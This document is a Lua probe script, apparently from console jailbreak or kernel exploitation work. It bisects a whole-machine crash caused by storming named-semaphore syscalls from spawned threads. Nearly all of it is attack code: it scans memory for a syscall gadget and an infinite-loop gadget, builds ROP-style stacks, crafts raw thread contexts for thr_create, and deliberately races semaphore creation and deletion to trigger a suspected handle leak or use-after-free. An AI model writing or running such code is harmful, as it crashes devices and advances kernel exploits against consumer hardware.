-- CRASH_CLASS: HIGH
-- PROBE 393a: what in 392a took the console down
--
-- 392a started three child threads that looped `551 open-by-name` on a named
-- semaphore while the main thread created and deleted that same name 200 times.
-- The console died - not the loader, the machine.
--
-- Two explanations fit and they need different follow-ups:
--   (1) a handle leak: every successful 551 returns a second handle that we never
--       close (552 refuses), so three children storming it can mint tens of
--       thousands of handles and exhaust a table;
--   (2) a reference-count race: a lookup that resolves the name while the object is
--       being deleted touches freed memory.
--
-- The saved 392a output narrows it further: it printed child1's row and then went
-- silent for 180 s, so the machine died while one child was storming a name that had
-- never been created (the error path) and the main thread was still inside the
-- second thr_create. Phase B of 392a - the create/delete race - was never reached.
--
-- The phases below therefore run the reproduction first and the theories after it:
--   [A] one child storms 551 on a name that does NOT exist, main idle - the exact
--       context of the death;
--   [B] the same storm on a name that exists - the handle-leak case;
--   [C] the create/delete path with no threads at all;
--   [D] the race: one child storming while main creates and deletes.

print("=== PROBE 393a: STORM BISECT ===")
print("")

local CRASH_GATES = 0x480
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(x) return uint64(string.format("0x%X", x)) end
local function addr_of(o) return sgn(uint64(o)) end
local function zero(addr, n) for i = 0, n - 4, 4 do pcall(function() memory.write_dword(addr + i, 0) end) end end

local sc_mmap = make_syscall(477)
local sc_thr  = make_syscall(430)
local sc_osem = make_syscall(549)
local sc_open = make_syscall(551)
local sc_del  = make_syscall(550)
local sc_info = make_syscall(593)
local sc_kill = make_syscall(431)

local gadget = syscall.syscall_address
local info = memory.alloc(0x200)
pcall(function() memory.write_dword(info, 0x160) end)
local rv = -1
pcall(function() rv = sgn(sc_info(uint64(0), uint64(info), uint64(0), uint64(0), uint64(0), uint64(0))) end)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
local park = nil
do
    local ok, s = pcall(function() return memory.read_buffer(base, 0x40000) end)
    if ok and type(s) == "string" then
        local i = 1
        while true do
            local a, b = s:byte(i, i + 1)
            if not a then break end
            if a == 0xEB and b == 0xFE then park = base + i - 1 break end
            i = i + 1
        end
    end
end
print(string.format("gadget=0x%X park=0x%X base=0x%X", to_num(gadget), park or 0, base))
if not park or not gadget then print("missing gadget") print("=== 393a DONE ===") return end

local name = memory.alloc(0x40)
zero(name, 0x40)
local NAME = "omp393a"
pcall(function() for i = 1, #NAME do memory.write_byte(name + i - 1, NAME:byte(i)) end end)
local namep = addr_of(name)

local function storm(rax, rdi, rsi, rdx, label, stack_bytes)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    local size = stack_bytes or 0x20000
    local stack = sgn(sc_mmap(uint64(0), u64(size), u64(3), u64(0x1002), u64(0xFFFFFFFF), u64(0)))
    if stack <= 0 then print("  " .. label .. " mmap failed " .. stack) return nil end
    local slots = math.floor(size / 8) - 1
    for i = 0, slots - 1 do pcall(function() memory.write_qword(stack + i * 8, u64(gadget)) end) end
    pcall(function() memory.write_qword(stack + slots * 8, u64(park)) end)
    pcall(function()
        memory.write_qword(ctx + 0x108, u64(CRASH_GATES))
        memory.write_qword(ctx + 0x0d0, u64(0))
        memory.write_qword(ctx + 0x110, u64(0x10000))
        memory.write_qword(ctx + 0x0c0, u64(0x43))
        memory.write_qword(ctx + 0x0e0, u64(gadget))
        memory.write_qword(ctx + 0x0f8, u64(stack + 8))
        memory.write_qword(ctx + 0x100, u64(0x3b))
        memory.write_qword(ctx + 0x048, u64(rdi))
        memory.write_qword(ctx + 0x050, u64(rsi))
        memory.write_qword(ctx + 0x058, u64(rdx))
        memory.write_qword(ctx + 0x078, u64(rax))
    end)
    local out = memory.alloc(8)
    zero(out, 8)
    local ret = -999
    pcall(function() ret = sgn(sc_thr(uint64(ctx), uint64(out), uint64(0), uint64(0), uint64(0), uint64(0))) end)
    local tid = sgn(uint64(out))
    print(string.format("  %s rax=%d calls=%d ret=%d tid=0x%X", label, rax, slots, ret, tid))
    return tid
end

-- [A] is the exact context of the 392a death: the name does not exist yet, so every
-- call takes the error path, and the main thread does nothing but spin.
print("[A] storm on a name that does NOT exist, one child")
local outb = memory.alloc(0x100)
zero(outb, 0x100)
local tidA = storm(551, namep, 0, addr_of(outb), "childA", 0x8000)
local spin = 0
for i = 1, 400000 do spin = spin + i end
print(string.format("[A] survived storm: spin=%d", spin))
if tidA then
    local kr = -999
    pcall(function() kr = sgn(sc_kill(u64(tidA), u64(0), u64(0), u64(0), u64(0), u64(0))) end)
    print(string.format("[A] thr_kill(childA)=%d", kr))
end

-- [B] the leak case: the name exists, so every call hands back a handle we never close.
print("[B] create the name, then storm on it")
local h0 = -1
pcall(function() h0 = sgn(sc_osem(uint64(namep), u64(0x100), u64(0), u64(1), u64(0), u64(0))) end)
print(string.format("[B] handle=%d", h0))
local tidB = storm(551, namep, 0, addr_of(outb), "childB", 0x8000)
local spin2 = 0
for i = 1, 400000 do spin2 = spin2 + i end
print(string.format("[B] survived storm: spin=%d", spin2))
if tidB then
    local kr2 = -999
    pcall(function() kr2 = sgn(sc_kill(u64(tidB), u64(0), u64(0), u64(0), u64(0), u64(0))) end)
    print(string.format("[B] thr_kill(childB)=%d", kr2))
end

-- [C] the delete path on its own, no threads.
print("[C] delete path alone: 549/550 x 200 with no children")
local created, deleted = 0, 0
for i = 1, 200 do
    local h = -1
    pcall(function() h = sgn(sc_osem(uint64(namep), u64(0x100), u64(0), u64(1), u64(0), u64(0))) end)
    if h > 0 then
        created = created + 1
        local d = -999
        pcall(function() d = sgn(sc_del(u64(h), u64(0), u64(0), u64(0), u64(0), u64(0))) end)
        if d == 0 then deleted = deleted + 1 end
    end
end
print(string.format("[C] created=%d deleted=%d", created, deleted))

-- [D] the race: one child storms while the main thread creates and deletes.
print("[D] race: one child storms 551 while main creates and deletes")
local tidD = storm(551, namep, 0, addr_of(outb), "childD", 0x8000)
local c2, d2 = 0, 0
for i = 1, 100 do
    local h = -1
    pcall(function() h = sgn(sc_osem(uint64(namep), u64(0x100), u64(0), u64(1), u64(0), u64(0))) end)
    if h > 0 then
        c2 = c2 + 1
        local d = -999
        pcall(function() d = sgn(sc_del(u64(h), u64(0), u64(0), u64(0), u64(0), u64(0))) end)
        if d == 0 then d2 = d2 + 1 end
    end
end
print(string.format("[D] created=%d deleted=%d", c2, d2))
print("still alive")
print("")
print("=== 393a DONE ===")
